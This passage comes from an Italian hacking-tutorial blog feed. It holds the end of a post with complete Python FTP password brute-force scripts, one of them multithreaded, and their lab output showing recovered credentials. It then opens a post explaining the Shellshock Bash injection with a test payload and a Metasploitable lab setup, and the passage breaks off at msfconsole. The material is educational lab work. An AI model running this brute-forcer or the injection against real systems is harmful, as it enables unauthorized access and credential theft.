    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
        &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials:&amp;#34;&lt;/span&gt;, password, Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))

&lt;span style=&#34;color:#75715e&#34;&gt;# iterate over passwords one by one&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# if the password is found, break out of the loop&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_correct(password):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ecco invece l’esempio piú complesso:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; threading &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Thread
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; queue
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (for Windows)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# init()&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# initialize the queue&lt;/span&gt;
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Queue()
&lt;span style=&#34;color:#75715e&#34;&gt;# number of threads to spawn&lt;/span&gt;
n_threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect_ftp&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; q
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# get the password from the queue&lt;/span&gt;
        password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
        &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
        server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
            &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials: &amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Host: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;host&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;User: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;user&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Password: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# we found the password, let&amp;#39;s clear the queue&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mutex:
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clear()
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all_tasks_done&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;notify_all()
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unfinished_tasks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# notify the queue that the task is completed for this password&lt;/span&gt;
            q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;task_done()

&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))

&lt;span style=&#34;color:#75715e&#34;&gt;# put all passwords to the queue&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
    q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;put(password)

&lt;span style=&#34;color:#75715e&#34;&gt;# create `n_threads` that runs that function&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n_threads):
    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;connect_ftp)
    &lt;span style=&#34;color:#75715e&#34;&gt;# will end when the main thread end&lt;/span&gt;
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;daemon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
&lt;span style=&#34;color:#75715e&#34;&gt;# wait for the queue to be empty&lt;/span&gt;
q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;prova-sul-campo&#34;&gt;Prova sul Campo&lt;/h1&gt;
&lt;p&gt;Ora che abbiamo tutto, mettiamo alla prova le nostre conoscenze.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Disclaimer: ⚠️ Quello che verrà visto di seguito è un esempio per il solo scopo educativo, violare sistemi informatici senza autorizzazione è un reato, vi invito dunque a replicare quanto vedrete SOLO su sistemi di vostra proprietà. ⚠️&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Andiamo a installare vsftpd e inseriamo un nuovo utente. L&amp;rsquo;utente appena creato avrà come credenziali:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;test : test&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Una volta creato &lt;code&gt;l&#39;utente&lt;/code&gt; &lt;em&gt;test&lt;/em&gt; con la &lt;code&gt;password&lt;/code&gt; &lt;em&gt;test&lt;/em&gt; possiamo inserire le relative informazioni nello script, useremo il secondo essendo che sfrutta i thread, una volta inserito nello script lo username dell&amp;rsquo;utente che ci interessa e l&amp;rsquo;indirizzo IP della macchina avviamo il codice python con:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 brute-ftp.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nel mio caso sto eseguendo lo script su un portatile con Pop os e la macchina &amp;ldquo;vittima&amp;rdquo; è una mcchina Ubuntu virtualizzata su VirtualBox. Una volta che lo script ha finito e riesce a trovare la password per l&amp;rsquo;utente test, questo è l&amp;rsquo;output:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Passwords to try: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying aheq
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying weeqe
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying 9wee
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying wewe
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying test
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found credentials: 
        Host: 192.168.1.242
        User: test
        Password: test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Cos&#39;è ShellShock</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/introduzione-a-shellshock/introduzione_a_shellshock/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/introduzione-a-shellshock/introduzione_a_shellshock/</guid>
      <description>Table of Contents  Cos&amp;rsquo;è Shellshock? In che modo Apache e CGI giocano in questo Exploit con Metasploit Privilage Escalation   Cos&amp;rsquo;è Shellshock? La vulnerabilità Shellshock consente a un aggressore di sfruttare vecchie versioni di Bash che salvano in modo scorretto le variabili d&amp;rsquo;ambiente. Tipicamente, quando si salva una funzione come variabile, la funzione della shell si interromperà dove è definita per terminare da parte del creatore. Le versioni vulnerabili di Bash consentiranno a un aggressore di eseguire comandi del sistema operativo che vengono inclusi dopo una funzione memorizzata all&amp;rsquo;interno di una variabile d&amp;rsquo;ambiente.</description>
      <content>&lt;hr&gt;
&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#cos-%C3%A8-shellshock-&#34;&gt;Cos&amp;rsquo;è Shellshock?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#in-che-modo-apache-e-cgi-giocano-in-questo&#34;&gt;In che modo Apache e CGI giocano in questo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exploit-con-metasploit&#34;&gt;Exploit con Metasploit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#privilage-escalation&#34;&gt;Privilage Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;cosè-shellshock&#34;&gt;Cos&amp;rsquo;è Shellshock?&lt;/h1&gt;
&lt;p&gt;La vulnerabilità Shellshock consente a un aggressore di sfruttare vecchie versioni di Bash che salvano in modo scorretto le variabili d&amp;rsquo;ambiente. Tipicamente, quando si salva una funzione come variabile, la funzione della shell si interromperà dove è definita per terminare da parte del creatore. Le versioni vulnerabili di Bash consentiranno a un aggressore di eseguire comandi del sistema operativo che vengono inclusi dopo una funzione memorizzata all&amp;rsquo;interno di una variabile d&amp;rsquo;ambiente. Vediamo un semplice esempio in cui definiamo una variabile d&amp;rsquo;ambiente e includiamo un comando maligno successivamente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ env y&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;() { :;}; echo vulnerable-shellshock&amp;#39;&lt;/span&gt; bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;echo not vulnerable&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Quando la variabile sopra è assegnata, Bash interpreterà la parte &lt;code&gt;y=&#39;() { :;};&#39;&lt;/code&gt; come la definizione di una funzione per una variabile &lt;code&gt;y&lt;/code&gt;. La funzione non fa nulla se non restituire un codice di uscita &lt;code&gt;0&lt;/code&gt;, ma quando viene importata, eseguirà il comando &lt;code&gt;echo vulnerable-shellshock&lt;/code&gt; se la versione di Bash è vulnerabile. Questo (o qualsiasi altro comando, come un one-liner per una reverse shell) verrà eseguito nel contesto dell&amp;rsquo;utente del server web. La maggior parte delle volte, questo sarà un utente come &lt;code&gt;www-data&lt;/code&gt;, e avremo accesso al sistema ma dovremo comunque ottenere privilegi elevati. Occasionalmente, potremo avere molta fortuna e ottenere l&amp;rsquo;accesso come utente &lt;code&gt;root&lt;/code&gt; se il server web viene eseguito in un contestoelevato.&lt;/p&gt;
&lt;p&gt;Se il sistema non è vulnerabile, verrà stampato solo &lt;code&gt;&amp;quot;not vulnerable&amp;quot;&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ env y&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;() { :;}; echo vulnerable-shellshock&amp;#39;&lt;/span&gt; bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;echo not vulnerable&amp;#34;&lt;/span&gt;

not vulnerable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;env y=&#39;() { :;}; echo vulnerable-shellshock&#39;&lt;/code&gt;: Questa parte del comando imposta una variabile d&amp;rsquo;ambiente chiamata &lt;code&gt;y&lt;/code&gt; con un valore specifico, che è una stringa che contiene una funzione Bash malevola (&lt;code&gt;() { :;}; echo vulnerable-shellshock&lt;/code&gt;). Questa funzione sfrutta la vulnerabilità Shellshock.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;bash -c &amp;quot;echo not vulnerable&amp;quot;&lt;/code&gt;: Questa parte del comando avvia una nuova istanza del shell Bash utilizzando l&amp;rsquo;opzione &lt;code&gt;-c&lt;/code&gt;, che consente di eseguire un comando specifico nel nuovo shell. Il comando specifico che viene eseguito è &lt;code&gt;echo not vulnerable&lt;/code&gt;, che stampa &amp;ldquo;not vulnerable&amp;rdquo; sulla console.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Quindi, se il sistema in cui viene eseguito questo comando è vulnerabile alla vulnerabilità Shellshock, il risultato sarà che verrà stampato &amp;ldquo;vulnerable-shellshock&amp;rdquo; anziché &amp;ldquo;not vulnerable&amp;rdquo;. In altre parole, la funzione malevola impostata nella variabile d&amp;rsquo;ambiente &lt;code&gt;y&lt;/code&gt; verrà eseguita a causa della vulnerabilità Shellshock. Tuttavia, se il sistema è stato correttamente patchato e non è più vulnerabile, verrà stampato &amp;ldquo;not vulnerable&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Questo comportamento non si verifica più su un sistema con il patch applicato, poiché Bash non eseguirà più il codice dopo che una definizione di funzione è stata importata. Inoltre,
Bash non interpreterà più &lt;code&gt;y=() {...}&lt;/code&gt; come una definizione di funzione. Ma piuttosto, le definizioni di funzione all&amp;rsquo;interno delle variabili d&amp;rsquo;ambiente non devono essere precedute da &lt;code&gt;BASH_FUNC_&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Riassumendo possiamo dire che in sostanza, Shellshock funziona &lt;em&gt;consentendo a un utente malintenzionato di inserire comandi pericolosi nelle definizioni delle funzioni all&amp;rsquo;interno delle variabili di ambiente&lt;/em&gt;. Questo verrebbe classificato come un tipo di attacco di &lt;strong&gt;code injection&lt;/strong&gt; e poiché Bash elaborerà questi comandi dopo la definizione della funzione, praticamente qualsiasi codice arbitrario può essere eseguito.&lt;/p&gt;
&lt;p&gt;Shellshock è in realtà un&amp;rsquo;intera famiglia di vulnerabilità costituita da molteplici vettori di sfruttamento. In questa guida sfrutteremo il vettore di attacco dello script CGI, in particolare il modulo mod_cgi che fa parte di Apache HTTP Server.&lt;/p&gt;
&lt;h1 id=&#34;in-che-modo-apache-e-cgi-giocano-in-questo&#34;&gt;In che modo Apache e CGI giocano in questo&lt;/h1&gt;
&lt;p&gt;Apache è un server Web open source multipiattaforma sviluppato da Apache Software Foundation. È robusto con funzionalità come hosting virtuale, schemi di autenticazione, SSL e TLS, messaggi di errore personalizzati e supporto di più linguaggi di programmazione.  Apache ha anche un modulo chiamato mod_cgi che gestisce l&amp;rsquo;esecuzione di script CGI (Common Gateway Interface).&lt;/p&gt;
&lt;p&gt;CGI è un protocollo progettato per consentire ai server Web di eseguire programmi simili a console direttamente sul server. Questi programmi, noti come script CGI, spesso gestiscono dati da pagine Web dinamiche e interagiscono tramite HTTP. Una nuova directory, generalmente denominata cgi-bin o qualcosa di simile, deve essere designata per abilitare l&amp;rsquo;esecuzione degli script CGI. Quando un browser richiede l&amp;rsquo;URL di un file specifico contenuto nella directory CGI, il server esegue lo script e l&amp;rsquo;output viene restituito al browser.&lt;/p&gt;
&lt;p&gt;Quando vengono eseguiti gli script CGI, informazioni specifiche vengono copiate nelle variabili di ambiente. Tali informazioni verranno successivamente passate a Bash se viene chiamato, fornendo così a un utente malintenzionato un modo per iniettare codice dannoso.  Fortunatamente, il team di Rapid7 ha sviluppato un modulo Metasploit che rende molto facile sfruttare questa vulnerabilità.&lt;/p&gt;
&lt;h1 id=&#34;exploit-con-metasploit&#34;&gt;Exploit con Metasploit&lt;/h1&gt;
&lt;p&gt;Metasploitable 2 è un&amp;rsquo;eccellente macchina virtuale piena di vulnerabilità con cui allenare le nostre abilità di hacking.&lt;/p&gt;
&lt;p&gt;Affinché questo exploit funzioni, deve esserci uno script eseguibile situato nella directory /cgi-bin. Utilizzeremo un semplice hello.sh, questo script Bash funzionerà a scopo dimostrativo. Passiamo a Metasploitable2 e andiamo in &lt;strong&gt;/usr/lib/cgi-bin&lt;/strong&gt; e digitiamo il seguente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo nano hello.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inseriamo la password corretta, quindi scriviamo all’interno quanto segue:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#! /bin/bash
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-type: text/html&amp;#34;&lt;/span&gt;
echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello world!&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Premiamo &lt;em&gt;Ctrl-X&lt;/em&gt;, seguito da &lt;em&gt;Y&lt;/em&gt; e &lt;em&gt;Enter&lt;/em&gt; per salvare. Per rendere eseguibile questo file, utilizziamo il comando &lt;strong&gt;chmod&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;755&lt;/span&gt; hello.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Possiamo verificare che funzioni correttamente navigando nel file sul server web:&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/exploit-shellshock.jpg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;Sulla macchina Kali, avviamo Metasploit digitando &lt;strong&gt;msfconsole&lt;/strong&gt; nel terminale. Siamo accolti da un banner casuale e dal prompt dei comandi di Metasploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k0bra3390㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
└─$ msfconsole
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
